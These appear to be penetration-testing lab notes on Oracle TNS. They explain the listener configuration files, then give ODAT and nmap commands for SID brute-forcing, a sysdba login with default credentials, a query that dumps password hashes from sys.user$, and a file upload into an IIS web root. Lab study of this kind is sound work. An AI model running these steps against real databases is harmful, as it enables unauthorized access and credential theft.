# Oracle TNS

## Default Configuration

The configuration files for Oracle TNS are called tnsnames.ora and listener.ora and are typically located in the $ORACLE_HOME/network/admin directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.

Each database or service has a unique entry in the tnsnames.ora file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple tnsnames.ora file might look like this:

### Tnsnames.ora

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

### Listener.ora

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList).
It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance.
It serves as a blacklist that cannot be accessed through the Oracle Application Server.

```
DESCRIPTION	A descriptor that provides a name for the database and its connection type.
ADDRESS	The network address of the database, which includes the hostname and port number.
PROTOCOL	The network protocol used for communication with the server
PORT	The port number used for communication with the server
CONNECT_DATA	Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.
INSTANCE_NAME	The name of the database instance the client wants to connect.
SERVICE_NAME	The name of the service that the client wants to connect to.
SERVER	The type of server used for the database connection, such as dedicated or shared.
USER	The username used to authenticate with the database server.
PASSWORD	The password used to authenticate with the database server.
SECURITY	The type of security for the connection.
VALIDATE_CERT	Whether to validate the certificate using SSL/TLS.
SSL_VERSION	The version of SSL/TLS to use for the connection.
CONNECT_TIMEOUT	The time limit in seconds for the client to establish a connection to the database.
RECEIVE_TIMEOUT	The time limit in seconds for the client to receive a response from the database.
SEND_TIMEOUT	The time limit in seconds for the client to send a request to the database.
SQLNET.EXPIRE_TIME	The time limit in seconds for the client to detect a connection has failed.
TRACE_LEVEL	The level of tracing for the database connection.
TRACE_DIRECTORY	The directory where the trace files are stored.
TRACE_FILE_NAME	The name of the trace file.
LOG_FILE	The file where the log information is stored.
```

## ODAT

```
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
pip3 install openpyxl
```

```
./odat.py all -s 10.129.204.235
```

## NMAP

```
sudo nmap -p1521 -sV 10.129.204.235 --open
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
## SQLPlus - Log In

```
sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus
```

https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared

```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

```
sqlplus -v
```

## Oracle RDBMS - Interaction

```
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
```

## Oracle RDBMS - Database Enumeration

```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

## Oracle RDBMS - Extract Password Hashes

```
SQL> select name, password from sys.user$;
```

## Oracle RDBMS - File Upload

```
Ramisto@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
Ramisto@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
Ramisto@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
```
